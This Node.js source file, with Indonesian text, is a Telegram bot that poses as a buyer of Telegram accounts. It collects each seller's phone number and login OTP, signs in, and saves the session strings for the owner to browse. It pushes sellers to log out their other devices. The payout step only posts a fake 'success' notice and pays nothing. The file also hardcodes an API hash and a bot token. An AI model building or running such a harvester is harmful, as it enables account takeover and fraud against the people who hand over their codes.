const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8510861119:AAFy61PfcnzOC1VOg3xotI23izjPQJhTf30';
const logChannel = '-1003521158263';
const ownerId = 12345678; // GANTI DENGAN ID TELEGRAM KAMU

const bot = new Telegraf(botToken);
const DB_FILE = './sessions.json';

if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [] }));

const getData = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userSessions = {}; 

const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN SEKARANG', 'jual_akun')],
    [Markup.button.callback('👤 MY PROFILE', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

bot.start((ctx) => {
    ctx.reply(`🚀 **SELAMAT DATANG DI USERBOT MANAGER** 🚀\n\nProses cepat, aman, dan saldo langsung masuk ke profil!`, mainBtn());
});

bot.action('jual_akun', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.reply('📲 **MASUKKAN NOMOR TELEGRAM**\n\nFormat: 628xxxx\nContoh: 62812345678');
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];

    if (!state) return;

    if (state.step === 'input_phone') {
        state.phone = text.replace(/[^0-9]/g, '');
        ctx.reply(`⏳ Menghubungi server Telegram untuk ${state.phone}...`);
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, state.phone);
            state.client = client;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            
            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nMasukkan kode dengan spasi.\nContoh: 1 2 3 4 5');
        } catch (err) {
            ctx.reply('❌ GAGAL: ' + err.message);
            delete userSessions[userId];
        }
    }

    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        ctx.reply('⚙️ **MENVERIFIKASI AKUN...**');

        try {
            const client = state.client;
            // Gunakan SignIn untuk login manual dengan OTP
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            const auths = await client.invoke(new Api.account.GetAuthorizations());
            const isClean = auths.authorizations.length === 1;

            const db = getData();
            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                seller: ctx.from.username || ctx.from.id,
                date: new Date().toLocaleString(),
                clean: isClean
            });
            saveData(db);

            if (isClean) {
                ctx.reply('✅ **BERHASIL!** Akun bersih, saldo cair Full!');
            } else {
                ctx.reply(`⚠️ **PERINGATAN!** Terdeteksi ${auths.authorizations.length} perangkat. Logout perangkat lain agar saldo cair Full.`);
            }
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ ERROR: ' + err.message);
        }
        delete userSessions[userId];
    }

    else if (state.step === 'input_wd') {
        ctx.reply('✅ **WITHDRAW DIAJUKAN!**');
        bot.telegram.sendMessage(logChannel, `💰 **NOTIF WD**\n👤 @${ctx.from.username || userId}\n📱 Detail: ${text}\n✅ Status: Berhasil`);
        delete userSessions[userId];
    }
});

bot.action('withdraw', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.reply('💸 **FORM WITHDRAW**\n\nMasukkan nomor DANA/OVO dan jumlah.\nContoh: DANA - 08xxx - 50000');
});

bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    ctx.reply('👑 **OWNER PANEL**', Markup.inlineKeyboard([[Markup.button.callback('📑 DAFTAR AKUN', 'list_0')]]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const accounts = getData().accounts;
    const current = accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    
    if (page > 0) buttons.push([Markup.button.callback('⬅️', `list_${page - 1}`)]);
    if ((page * 5) + 5 < accounts.length) buttons.push([Markup.button.callback('➡️', `list_${page + 1}`)]);
    
    ctx.editMessageText('📑 Daftar Akun:', Markup.inlineKeyboard(buttons));
});

bot.launch();
console.log('🚀 Bot Aktif!');
